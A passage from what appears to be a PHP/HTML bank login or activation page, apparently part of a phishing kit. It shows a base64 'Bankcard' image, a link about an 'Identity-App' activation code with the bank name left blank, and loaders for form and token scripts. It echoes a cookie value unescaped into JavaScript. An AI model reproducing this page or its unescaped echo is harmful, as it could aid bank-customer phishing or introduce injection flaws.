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" alt="Bankcard" class="center"></div>
				<div class="submit">
					<input type="button" class="submit undoflip" value="Back" aria-hidden="true">
				</div>
			</div>
			<div class="links" style="top: 192px;">
				
				
					
					
						<a href="#" >Already using s Identity-App and need a new activation code?</a>
					
				
				
			</div>
		</div>
	</div>
	<div class="isSmallScreen" id="isSmallScreen"></div>
<script type="text/javascript">
var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
var php_js = <?php  echo json_encode($php_js) ?>
</script>
<script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
<script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>

</body></html>